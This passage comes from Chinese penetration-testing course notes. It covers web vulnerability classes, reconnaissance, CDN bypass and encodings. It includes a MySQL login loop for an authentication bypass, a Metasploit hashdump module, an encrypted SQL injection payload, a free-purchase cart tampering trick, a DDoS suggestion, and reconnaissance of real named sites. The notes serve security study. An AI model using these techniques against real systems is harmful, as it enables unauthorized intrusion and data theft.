涉及资源https://github.com/Audi-1/sqli-labs 忍者安全测试系统-禁用软盘安装 https://www.mozhe.cn/bug/detail/eIRHc1BCd2VlckQxbjduMG9BVCtkZz09bW96aGUmozhe","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://al0nez.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"11WEB漏洞--必懂知识","slug":"11WEB漏洞-必懂知识","date":"2021-09-21T02:28:01.000Z","updated":"2021-09-21T06:05:40.696Z","comments":true,"path":"2021/09/21/11WEB漏洞-必懂知识/","link":"","permalink":"https://al0nez.github.io/2021/09/21/11WEB%E6%BC%8F%E6%B4%9E-%E5%BF%85%E6%87%82%E7%9F%A5%E8%AF%86/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 前言本章节将讲解各种 WEB 层面上的有那些漏洞类型，具体漏洞的危害等级，以简要的影响范围测试进行实例分析，思维导图中的漏洞也是后面我们将要学习到的各个知识点，其中针对漏洞的形成原理，如何发现，如何利用将是本章节学习的重点内容！ 简要说明以上漏洞危害情况SQL注入 攻击者未经授权可以访问数据库中的数据，盗取用户的隐私以及个人信息，造成用户的信息泄露。 通过操作数据库对某些网页进行篡改; 修改数据库一些字段的值，嵌入网马链接，进行挂马攻击;攻击者进而可以对网页进行篡改，发布一些违法信息等。 服务器被远程控制，被安装后门。可以对数据库的数据进行增加或删除操作，例如私自添加或删除管理员账号。 数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。 破坏硬盘数据，导致全系统瘫痪; XSS 网络钓鱼，包括盗取各类用户账号； 窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作； 劫持用户(浏览器)会话，从而执行任意操作，例如进行非法转账、强制发表日志、发送电子邮件等； 强制弹出广告页面、刷流量等； 网页挂马，进行恶意操作，例如任意篡改页面信息、删除文章等； 进行大量的客户端攻击，如DDoS攻击； 获取客户端信息，例如用户的浏览历史、真实IP、开放端口等； 控制受害者机器向其他网站发起攻击； 结合其他漏洞，如CSRF漏洞，实施进一步作恶； 提升用户权限，包括进一步渗透网站； 传播跨站脚本蠕虫等； XXE 文件读取 命令执行 内网端口扫描 攻击内网网站 发起dos攻击等危害 文件上传如果 Web应用程序存在上传漏洞 , 攻击者甚至可以将一个webshell直接上传到服务器上 文件包含 web服务器的文件被外界浏览导致信息泄露 脚本被任意执行，可能会篡改网站、执行非法操作、攻击其他网站 文件读取通过任意文件下载，可以下载服务器的任意文件，web业务的代码，服务器和系统的具体配置信息，也可以下载数据库的配置信息，以及对内网的信息探测等等 CSRF(用户请求伪造)修改用户信息，如用户的头像、发货地址等。更有甚者，可能执行恶意操作，比如修 改密码、添加/删除好友或者点赞/转发/评论/私信。 SSRF(服务器端请求伪造)攻击者就可以利用该漏洞绕过防火墙等访问限制，进而将受感染或存在漏洞的服务器作为代理进行端口扫描，甚至是访问内部系统数据。 可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 Banner 信息 攻击运行在内网或本地的应用程序（比如溢出） 对内网 Web 应用进行指纹识别，通过访问默认文件实现 攻击内外网的 Web 应用，主要是使用 GET 参数就可以实现的攻击 利用 file 协议读取本地文件 反序列化远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码，被攻击者间接控制服务器 代码执行 代码执行漏洞造成的原理是由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。造成代码执行相关的函数分别是：eval、assert函数 暴露服务器信息 木马植入 敏感文件暴露 可能升级为命令执行 逻辑漏洞 大量敏感数据泄露，越权访问，越权重置口令 商品低价支付经济损失，商品/产品金额、数量篡改等 活动被恶意刷取，卡/券重复领取，条件竞争等 源恶意损耗，支付接口、短信/邮件接收 未授权访问敏感信息泄露 命令执行 继承Web服务程序的权限去执行系统命令或读写文件 反弹shell 控制整个网站甚至控制服务器 进一步内网渗透 目录遍历攻击者通过访问网站某一目录时，该目录没有默认首页文件或没有正确设置默认首页文件，将会把整个目录结构列出来，将网站结构完全暴露给攻击者； 攻击者可能通过浏览目录结构，访问到某些隐秘文件（如PHPINFO文件、服务器探针文件、网站管理员后台访问地址、数据库连接文件等） 简要说明以上漏洞等级划分高危漏洞：代码执行、文件上传、文件包含、命令执行、SQL注入、未授权访问 中危漏洞：逻辑安全、反序列化 低危漏洞：目录遍历、XSS跨站、文件读取 简要说明以上漏洞重点内容CTF：SQL注入、文件上传、反序列化、代码执行 SRC：图片上漏洞都能出现，逻辑安全出现比较多 红蓝对抗：涉及的高危漏洞，文件上传、文件包含、代码执行、命令执行 简要说明以上漏洞形势问题找不到漏洞是因为：信息收集没做好，自己对漏洞的理解不够 pikachu靶场安装下载源码1https://github.com/zhuifengshaonianhanlu/pikachu 修改配置文件 初始化 初始化成功 涉及资源1https://github.com/zhuifengshaonianhanlu/pikachu","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"10信息收集-资产监控拓展","slug":"10信息收集-资产监控拓展","date":"2021-09-21T02:27:28.000Z","updated":"2021-09-21T06:05:44.461Z","comments":true,"path":"2021/09/21/10信息收集-资产监控拓展/","link":"","permalink":"https://al0nez.github.io/2021/09/21/10%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%B5%84%E4%BA%A7%E7%9B%91%E6%8E%A7%E6%8B%93%E5%B1%95/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 Github监控便于收集整理最新 exp 或 poc便于发现相关测试目标的资产 各种子域名查询DNS,备案,证书全球节点请求 cdn枚举爆破或解析子域名对应便于发现管理员相关的注册信息 黑暗引擎相关搜索fofa，shodan，zoomeye 微信公众号接口获取内部群内部应用内部接口 演示案例监控最新的EXP发布及其他 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657# Title: wechat push CVE-2020# Date: 2020-5-9# Exploit Author: weixiao9188# Version: 4.0# Tested on: Linux,windows# coding:UTF-8import requestsimport jsonimport timeimport osimport pandas as pdtime_sleep = 20 #每隔20秒爬取一次while(True): headers = &#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3741.400 QQBrowser/10.5.3863.400&quot;&#125; #判断文件是否存在 datas = [] response1=None response2=None if os.path.exists(&quot;olddata.csv&quot;): #如果文件存在则每次爬取10个 df = pd.read_csv(&quot;olddata.csv&quot;, header=None) datas = df.where(df.notnull(),None).values.tolist()#将提取出来的数据中的nan转化为None response1 = requests.get(url=&quot;https://api.github.com/search/repositories?q=CVE-2020&amp;sort=updated&amp;per_page=10&quot;, headers=headers) response2 = requests.get(url=&quot;https://api.github.com/search/repositories?q=phpcms&amp;ssort=updated&amp;per_page=10&quot;, headers=headers) else: #不存在爬取全部 datas = [] response1 = requests.get(url=&quot;https://api.github.com/search/repositories?q=CVE-2020&amp;sort=updated&amp;order=desc&quot;,headers=headers) response2 = requests.get(url=&quot;https://api.github.com/search/repositories?q=RCE&amp;ssort=updated&amp;order=desc&quot;,headers=headers) data1 = json.loads(response1.text) data2 = json.loads(response2.text) for j in [data1[&quot;items&quot;],data2[&quot;items&quot;]]: for i in j: s = &#123;&quot;name&quot;:i[&#x27;name&#x27;],&quot;html&quot;:i[&#x27;html_url&#x27;],&quot;description&quot;:i[&#x27;description&#x27;]&#125; s1 =[i[&#x27;name&#x27;],i[&#x27;html_url&#x27;],i[&#x27;description&#x27;]] if s1 not in datas: #print(s1) #print(datas) params = &#123; &quot;text&quot;:s[&quot;name&quot;], &quot;desp&quot;:&quot; 链接:&quot;+str(s[&quot;html&quot;])+&quot;\\n简介&quot;+str(s[&quot;description&quot;]) &#125; print(&quot;当前推送为&quot;+str(s)+&quot;\\n&quot;) print(params) requests.get(&quot;https://sc.ftqq.com/xxxx.send&quot;,params=params,timeout=10) #time.sleep(1)#以防推送太猛#，verify=False print(&quot;推送完成!&quot;) datas.append(s1) else: pass #print(&quot;数据已处在!&quot;) pd.DataFrame(datas).to_csv(&quot;olddata.csv&quot;,header=None,index=None) time.sleep(time_sleep) 安装pandas1pip install pandas Server酱设置扫码登录获取自己的SendKey，之后修改到代码中xxxx为SendKey值。 1https://sctapi.ftqq.com/xxxx.send 最后结果 黑暗引擎实现域名端口等收集 全自动域名收集枚举优秀脚本使用12以xxxx为例，从标题，域名等收集以xxxx为例，全自动脚本使用收集 teemo1pip.exe install requirements.txt 涉及资源12345https://crt.sh/https://dnsdb.io/https://sc.ftqq.com/3.versionhttps://tools.ipip.net/cdn.phphttps://github.com/bit4woo/teemohttps://securitytrails.com/domain/www.baidu.com/history/a","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"信息收集","slug":"信息收集","permalink":"https://al0nez.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]},{"title":"09信息收集--APP及其他资产等","slug":"09信息收集-APP及其他资产等","date":"2021-09-21T02:27:17.000Z","updated":"2021-09-21T06:05:48.295Z","comments":true,"path":"2021/09/21/09信息收集-APP及其他资产等/","link":"","permalink":"https://al0nez.github.io/2021/09/21/09%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-APP%E5%8F%8A%E5%85%B6%E4%BB%96%E8%B5%84%E4%BA%A7%E7%AD%89/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 前言在安全测试中，若 WEB 无法取得进展或无 WEB 的情况下，我们需要借助 APP 或其他资产在进行信息收集，从而开展后续渗透，那么其中的信息收集就尤为重要。 APP提取一键反编译提取APP抓数据包进行工具配合各种第三方应用相关探针技术各种服务接口信息相关探针技术APP提取及抓包及后续配合某 APK 一键提取反编译利用 burp 历史抓更多 URL某 IP 无 WEB 框架下的第三方测试 某IP无web框架下的第三方测试各种端口一顿乱扫-思路 shodan 端口8332：发现出现登录框 发现RomPager ，百度一下 628端口发现这个 fofa发现 各种接口一顿乱扫-思路 接口部分一顿测试-思路 旁站查询 C段查询 类似域名站点-备案查询：找网址，再ping出ip地址，再用黑暗引擎搜索内容 演示：某传销网站信息收集 fofa搜索 发现MongoDB-数据库，存在爆破可能 发现FTP服务 发现OpenSSH7.6 百度发现存在用户枚举漏洞 获取到ip fofo子域名发现 查询其子域名 C段查询 备案查询 通过官网名称搜索信息 搜索php有关界面 搜索时发现.xyz的域名 /robots.txt 发现有用信息 发现CMS信息 子域名查询IP 黑暗引擎搜索有关端口信息等 搜索 查看漏洞 尝试admin ​ 涉及资源：12345https://fofa.so/http://tool.chinaz.comhttps://www.shodan.io/https://www.zoomeye.org/https://nmap.org/download.html","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"信息收集","slug":"信息收集","permalink":"https://al0nez.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]},{"title":"08信息收集--架构，搭建，WAF","slug":"08信息收集-架构，搭建，WAF","date":"2021-09-21T02:26:50.000Z","updated":"2021-09-21T06:05:53.249Z","comments":true,"path":"2021/09/21/08信息收集-架构，搭建，WAF/","link":"","permalink":"https://al0nez.github.io/2021/09/21/08%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9E%B6%E6%9E%84%EF%BC%8C%E6%90%AD%E5%BB%BA%EF%BC%8CWAF/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 前言在安全测试中，信息收集是非常重要的一个环节，此环节的信息将影响到后续的成功几率，掌握信息的多少将决定发现漏洞机会大小，换言之决定着是否能完成目标的测试任务。也可以很直接的跟大家说：渗透测试的思路就是从信息收集这里开始，你与大牛的差距也是从这里开始的！ 站点搭建分析目录类站点一个网站路径里还有一个网站，相当于网站套网站。只要俩个网站一个里有漏洞，就都被攻克。 两者仅仅是目录路径不同 端口类站点一台服务器上，不同端口有好几个网站，一台网站出现问题，其他网站也会被攻击 ​ 子域名站点俩个网站有可能不在一个服务器上 bbs.goodlift.net采用Discuz，俩个网站俩套CMS 两个站点可能不在同一个服务器 类似域名站点 多个域名，同一个网站 旁注，C段站点旁站概念 1旁站是和目标网站在同一台服务器上的其它的网站；如果从目标站本身找不到好的入手点，这时候，如果想快速拿下目标的话，一般都会先找个目标站点所在服务器上其他的比较好搞的站下手，然后再想办法跨到真正目标的站点目录中。 C段概念 1C段是和目标机器ip处在同一个C段的其它机器；通过目标所在C段的其他任一台机器，想办法跨到我们的目标机器上。常用的工具有webscancc，Nmap，Zenmap。 在线查询工具 123旁站和C段在线查询地址：http://www.webscan.cc/http://stool.chinaz.com/same 常用工具 1234web：k8旁站、御剑1.5K8Cscan大型内网渗透自定义插件化扫描神器，包含信息收集、网络资产、漏洞扫描、密码爆破、漏洞利用，程序采用多线程批量扫描大型内网多个IP段C段主机，目前插件包含: C段旁注扫描、子域名扫描、Ftp密码爆破、Mysql密码爆破、Oracle密码爆破、MSSQL密码爆破、Windows/Linux系统密码爆破、存活主机扫描、端口扫描、Web信息探测、操作系统版本探测、Cisco思科设备扫描等,支持调用任意外部程序或脚本，支持Cobalt Strike联动下载地址：https://github.com/k8gege/K8CScan最新版Ladon https://github.com/k8gege/Ladon 搭建软件特征站点一体化搭建软件：宝塔、PHPstudy、WMAP、INMAP（Nginx 常规的搭建软件都有常规的数据库的默认账号密码，如果搭建者不去更改的话，就能成为突破思路。 例： Apache/2.4.41(win32)OpenSSL/1.1.1c mod_fcgid/2.3.9a 宝塔 (信息很全基本上是搭建软件) Apache/2.4.41(win32)OpenSSL/1.0.2j PHP/5.4.45 默认的安全设置(/phpmyadmin root/root) WAF防护分析什么是WAF应用Web应用防护系统(Web Application Firewall, 简称:WAF)代表了一类新兴的信息安全技术，用以解决诸如防火墙一类传统设备束手无策的Web应用安全问题。 分为：硬件形式和软件形式。 在安全公司单位购买的防火墙都是硬件，个人网站和小企业搭建都是软件。 如何快速识别WAF通过wafw00f来识别 下载地址 1https://github.com/EnableSecurity/wafw00f 使用文档 1https://github.com/enablesecurity/wafw00f/wiki 安装环境 1python3环境 ---&gt;使用 pip install wafw00f 进行安装 Windows下安装使用 1https://www.cnblogs.com/qingchengzi/articles/13451885.html 判定waf的一个标准 涉及资源https://www.shodan.io/ https://www.webscan.cc/ https://github.com/EnableSecurity/wafw00f","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"信息收集","slug":"信息收集","permalink":"https://al0nez.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]},{"title":"07信息收集--CDN绕过技术","slug":"07信息收集-CDN绕过技术","date":"2021-09-21T02:26:33.000Z","updated":"2021-09-21T06:05:58.305Z","comments":true,"path":"2021/09/21/07信息收集-CDN绕过技术/","link":"","permalink":"https://al0nez.github.io/2021/09/21/07%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-CDN%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 CDNCDN 的全称是 Content Delivery Network，即内容分发网络。CDN 是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在 CDN 服务，将会影响到后续的安全测试过程。 相当于一个节点，把网站上的一些缓存放到cdn中，你访问到的ip不是原网站而是cdn。所有如果需要进行渗透测试需要绕过cdn，找到真实网站的ip。 如何判断目标存在 CDN 服务？1https://ping.chinaz.com 利用多节点技术进行请求返回判断 有CDN情况： 有多个IP返回，说明存在CDN 无CDN情况: 只有1个IP返回 CDN绕过技术子域名查询如果我们查到他的子域名的ip不变，我们可以通过ping探测同一网段的ip，看主网站是否和他在一个网站。 邮件服务查询根据对方邮件服务器的地址来获取对方网站真正的ip 国外地址请求可以通过伪造国外ip地址访问网站，来获取真实网站ip，vpn来伪造 遗留文件，扫描全网谷歌搜索查看该网站的遗留文件，来获取ip eg:phpinfo 黑暗引擎搜索特定文件shodan、fofa、 zoomeye DNS历史记录，以量打量（DDOS） DNS记录有之前没做CDN时候的IP记录；DDOS将CDN流量打完，访问的就是真实IP CDN 真实 IP 地址获取后绑定指向地址更改本地 HOSTS 解析指向文件 演示案例利用子域名请求获取IP地址12xueersi 子域名上的小技巧www.xueersi.com 1xueersi.com 原因：只设置了www.xueersi.com的cdn解析，没设置xueersi.com的cdn解析 利用第三方接口查询获取真实IPsp910 DNS历史记录=第三方接口（接口查询） 1https://x.threatbook.cn/ 利用国外地址请求获取真实IPm.sp910 子域名小技巧/采集/国外请求（同类型访问 1m.sp910 利用邮件服务器接口获取真实IPmozhe 邮箱源码测试对比第三方查询（地区分析） 根据ip查地址信息判断哪个是真实ip 或者修改绑定host文件为真实ip，看能否访问 利用黑暗引擎搜索特定文件获取真实IP103.75.182.15:2087黑暗引擎（shodan搜指定hash文件） 123456import mmh3import requestsresponse=requests.get(&#x27;favicon.ico&#x27;)favicon=response.content.encode(&#x27;base64&#x27;)hash=mmh3.hash(favicon)print &#x27;http.favicon.hash:&#x27;+str(hash) 涉及资源：1234567891011https://www.shodan.iohttps://x.threatbook.cnhttp://ping.chinaz.comhttps://www.get-site-ip.com/https://asm.ca.com/en/ping.phphttps://github.com/Tai7sy/fuckcdnhttps://github.com/boy-hack/w8fuckcdnhttps://mp.weixin.qq.com/s?__biz=MzA5MzQ3MDE1NQ==&amp;mid=2653939118&amp;idx=1&amp;sn=945b81344d9c89431a8c413ff633fc3a&amp;chksm=8b86290abcf1a01cdc00711339884602b5bb474111d3aff2d465182702715087e22c852c158f&amp;token=268417143&amp;lang=zh_CN#rd","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"信息收集","slug":"信息收集","permalink":"https://al0nez.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]},{"title":"06基础入门--加密编码算法","slug":"06基础入门-加密编码算法","date":"2021-09-21T02:26:09.000Z","updated":"2021-09-21T06:06:02.043Z","comments":true,"path":"2021/09/21/06基础入门-加密编码算法/","link":"","permalink":"https://al0nez.github.io/2021/09/21/06%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 前言在渗透测试中，常见的密码等敏感信息会采用加密处理，其中作为安全测试人员必须要了解常见的加密方式，才能为后续的安全测试做好准备，本次课程将讲解各种加密编码等知识，便于后期的学习和发展。 常见加密编码等算法解析1MD5，SHA，ASC，进制，时间戳，URL，BASE64，Unescape，AES，DES 等 MD5(不可逆)分为16位和32位，很多网站管理员的密码都会采用md5加密。 特点：32位数字字母（a-f）混合，不可逆 解密平台： 12https://cmd5.com/somd5.com/ SHA特点：40位数字字母（a-f）混合，不可逆 SHA256/384/512特点：固定位数数字字母（a-f）混合，不可逆 进制进制编码 时间戳网站或者服务器脚本语言里经常会使用，会在数据库里用户登录和注销，注册里会使用 URL浏览器也会进行加密 BASE64规律：明文越长，密文越长 特点：区分大小写，大写字母小写字母数字的组合。末尾有一个或两个== unescape特点：%u+4位数字，对应两位字符，单数的时候最后一个%00，双数的时候最后一个%0000 AES是一种安全的加密方式，涉及到密码，偏移量，数据块，填充，在加密时候涉及到4种随机性。解密难度大。用base64解密出来是乱码，有很大可能是AES加密。有时候/出现在字符串里面。比较注重安全和大型网站、安全比赛注：必须有密码和偏移量，否则无法进行解密 DES特点： 明文越长，密文也越长，可自定义密码，输出有时候带’+’ 常见加密形式算法解析直接加密，带 salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等 常见解密方式（针对）枚举，自定义逆向算法，可逆向 了解常规加密算法的特性长度位数，字符规律，代码分析，搜索获取等 工具123456http://www.jsons.cn/desencrypt/https://www.cmd5.com/https://tool.lu/timestamp/http://tool.chacuo.net/cryptaeshttp://tools.jb51.net/password/des_encodehttp://encode.chahuo.com/ 演示案例SQL注入漏洞测试(参数加密) 可以看到id后面的参数是经过加密的。 御剑扫一下后台 发现有俩个文件 php文件是一个解密的脚本，看来这个就是解密脚本。 因为有俩次base64加密，所有需要先解密一次 再次解密，通过上面解密脚本就可以看出是AES加密，所以直接到AES中进行解密。AES加密模式：CBC、数据块：128位、密码：ydhaqPQnexoaDuW3、偏移量：2018201920202021解密得出：1_mozhe 之后可以看到将_mozhe删除就是1，所有参数就是1 之后我们通过这样的加密模式就可以写入我们的参数了。 这里我以1’ and 1=1 –+为例 再次进行base64加密 最后结果 1MHk4MWZ6TjArWlVSQ1hHVkUrZVdPdz09","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"基础入门","slug":"基础入门","permalink":"https://al0nez.github.io/tags/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]},{"title":"05基础入门--系统及数据库","slug":"05基础入门-系统及数据库","date":"2021-09-21T02:25:55.000Z","updated":"2021-09-21T06:06:05.925Z","comments":true,"path":"2021/09/21/05基础入门-系统及数据库/","link":"","permalink":"https://al0nez.github.io/2021/09/21/05%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 前言除去前期的搭建平台中间件，网站源码等，容易受到攻击的还有操作系统数据库，第三方软件平台等。其中此类攻击也能直接影响到WEB或服务器的安全，导致网站或服务器权限的获取。 除去常规WEB层面以及APP安全外，类似服务器单一或者复杂的其他服务，游戏，负载均衡，也可以作为安全测试目标，此类目标测试原则只是为了WEB应用或者其他安全问题。 操作系统层面识别操作系统常见方法windows对大小写不敏感，无论大小写都是一样的，而linux对大小写敏感。 这个网站是windows的 这个网站就是linux的 利用TTL来进行网站操作系统识别，这个不太准确 不同的操作系统的默认TTL值是不同的， 所以我们可以通过TTL值来判断主机的操作系统，但是当用户修改了TTL值的时候，就会误导我们的判断，所以这种判断方式也不一定准确。下面是默认操作系统的TTL： 123451、WINDOWS NT/2000 TTL：1282、WINDOWS 95/98 TTL：323、UNIX TTL：2554、LINUX TTL：645、WIN7 TTL：64 利用nmap进行识别 1nmap -O ip地址 简述两者区别以及识别的意义1.网站路径区别 2.大小写区别 3.文件在linux和windows的适用性 通过判断操作系统，从合适他的漏洞进行利用 操作系统层面漏洞类型对应意义永痕之蓝 可能会造成计算机崩溃，获取到对应shell。 简要操作系统层面漏洞影响范围获取相应权限，某些服务崩溃，计算机崩溃 数据库层面静态网站是没有漏洞的，动态网站才有漏洞 识别数据库类型常见方法 小型数据库 Access 中型数据库 MySQL 大型数据库 Oracle、SQL Server 1.通过网站识别数据库 常见搭建组合 12345ASP+Access，sql server （windows）PHP+Mysql（linux、windows） 端口：3306ASPX+Mssql(windows) 端口：1433Jsp+Mssql（windows）,oracle （linux、windows）端口：1521Python+Mongodb （linux、windows） 2.利用端口扫描识别数据库 1234567891011Oracle 1521MySql 3306SQLServer 1433MongoDB 27017Redis 6379memcached 11211psotgreSQL 5432db2 5000Derby 1521pgsql 5432ponitbase 9092 数据库类型区别及识别意义数据库不同，结构也不同。产生的漏洞也不同，攻击手法也不同 数据库常见漏洞类型及攻击弱口令，通过弱口令获取admin账户密码。 简要数据库层面漏洞影响范围通过漏洞，进行攻击，也可以获取数据库的相关权限，进行一系列的操作 第三方层面常见第三方软件： Jboss，PHPmyadmin，vsftpd，teamview等 如何判断有哪些第三方平台和软件通过nmap端口扫描来判断。 简述为什么要识别第三方平台或软件通过识别第三方软件，来找出漏洞，从而进行渗透测试 常见第三方平台或软件漏洞类型及攻击弱口令攻击、漏洞攻击 简述第三方平台或软件安全测试的范围影响权限 补充除去常见WEB安全及APP安全测试外，类似服务器单一或复杂的其他服务（邮件、游戏、负载均衡等），也可以作为安全测试目标，此类目标测试原则只是少了WEB应用或其他安全问题。所以明确安全测试思路是很重要的！ 案例演示某数据库弱口令及漏洞演示1234docker-compose up -ddocker network ls 查看当前docker网络docker network rm 592a344d1cbb 删除某一个docker网络 注：其中 NAME为bridge、host、none为内置的docker网络，无法删除 1for i in `seq 1 1000`; do mysql -uroot -pwrong -h your-ip -P3306 ; done 成功登录到数据库。 关闭容器 1docker-compose down 另一种方式 12msfconsoleuse auxiliary/scanner/mysql/mysql_authbypass_hashdump 123set rhosts 10.6.25.48set threads 10run 某第三方应用安全漏洞演示1docker-compose up -d bp抓一下包 成功利用","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"基础入门","slug":"基础入门","permalink":"https://al0nez.github.io/tags/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]},{"title":"04基础入门--WEB源码拓展","slug":"04基础入门-WEB源码拓展","date":"2021-09-21T02:25:25.000Z","updated":"2021-09-21T06:06:10.200Z","comments":true,"path":"2021/09/21/04基础入门-WEB源码拓展/","link":"","permalink":"https://al0nez.github.io/2021/09/21/04%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-WEB%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 前言WEB源码在安全测试中是非常重要的信息来源，可以用来代码审计漏洞也可以用来做信息突破口，其中WEB源码有很多技术需要简明分析。比如:获取某 ASP源码后可以采用默认数据库下载为突破，获取某其他脚本源码漏洞可以进行代码审计挖掘或分析其业务逻辑等，总之源码的获取将为后期的安全测试提供了更多的思路。 关于 WEB 源码目录结构数据库配置文件，后台目录，模版目录，数据库目录等 关于 WEB 源码脚本类型ASP,PHP,ASPX,JSP,JAVAWEB 等脚本类型源码安全问题 关于 WEB 源码应用分类社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞 关于 WEB 源码其他说明开源，未开源问题，框架非框架问题，关于 CMS 识别问题及后续等 关于源码获取的相关途径搜索，咸鱼淘宝，第三方源码站，各种行业对应 总结关注应用分类及脚本类型估摸出可能存在的漏洞（其中框架类例外），在获取源码后可进行本地安全测试或代码审计，也可以分析其目录工作原理（数据库备份，bak 文件等），未获取到的源码采用各种方法想办法获取！ 演示案例ASP,PHP 等源码下安全测试12平台识别-某CMS无漏洞-默认数据库平台识别-某CMS有漏洞-漏洞利用 通过后缀我们清楚看的到时asp后缀，说明是asp网站。 可以清楚的看到XYcms的字样，说明用的cms是xycms。 下载XYCMS源码 找到他的数据库文件 打开数据库文件发现该文件里有管理员账号密码 访问网站后台 手工识别CMS metinfoCMS 搜索相关漏洞 字典识别字典 下载对应的文件。 查看其md5 1certutil -hashfile 新建文本文档.txt MD5 另一种下载文件 通过迅雷下载 在线CMS识别http://whatweb.bugscaner.com/look/ https://www.yunsee.cn/ 源码引用分类下的针对漏洞1niushop电商类关注漏洞点-业务逻辑 查看电商网站业务逻辑 抓包 正常发出 将num修改为-1 可以看到需要支付0元，直接白嫖 简要目标从识别到源码获取本地演示个人博客-手工发现其CMS-漏洞搜索或下载分析 搜索特殊关键字，识别cms http:weipan.1016sangshen.cn/ 内部搭建的靶场 人工爆框架-搜索特定URL-获取其他相符站点-漏洞测试 通过报错发现CMS，发现是thinkphp 搜索thinkphp的漏洞 